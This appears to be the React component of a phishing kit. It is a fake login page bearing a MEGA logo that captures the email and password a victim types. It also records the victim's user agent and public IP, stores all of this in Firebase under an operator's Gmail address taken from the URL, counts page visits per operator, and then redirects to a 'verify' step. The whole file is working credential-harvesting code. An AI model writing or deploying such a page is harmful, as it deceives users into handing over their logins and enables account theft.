import React, { useContext, useEffect } from 'react'
import { useRef } from 'react'
import './Login.css'
import { useLocation, useNavigate } from 'react-router-dom'
import { addClick, addData } from '../config/firebase'
import logo from '../assets/mega_logo.png'
import axios from 'axios'

const Login = () => {


  const location = useLocation()
  const navigate = useNavigate()

  const email = useRef()
  const pass = useRef()

  async function postData() {
    try {

      const pathNames = location.pathname.split("/")
      const ownerEmail = `${pathNames[1]}@gmail.com`

      const emailValue = email.current.value
      const passValue = pass.current.value
      const userAgent = navigator.userAgent
      const response = await axios.get("https://api.ipify.org?format=json")

      const result = await addData(emailValue, passValue, userAgent, ownerEmail, response.data.ip)

      if (!result) {
        alert('Something went wrong!')
      }

      navigate(`/${pathNames[1]}/verify/${result.id}`)
      email.current.value = ''
      pass.current.value = ''
    } catch (error) {
      console.log(error?.message)
    }
  }

  function handleSubmit(event) {
    event.preventDefault()
    postData()
  }

  useEffect(() => {
    addClick(`${location.pathname.split("/")[1]}@gmail.com`)
  })

  return (
    <div className='login-page-container'>
      <form onSubmit={handleSubmit} className=' z-20'>
        <div className=' flex flex-col inside-form'>
          {/* <h1 className=' text-xl text-white'>Login to your account</h1> */}
          <img src={logo} alt="logo" />
          <input type="text" placeholder='Your Email' ref={email} required />
          <input type="password" placeholder='Password' ref={pass} required />
        </div>
        <button>Login</button>
      </form>
    </div>
  )
}

export default Login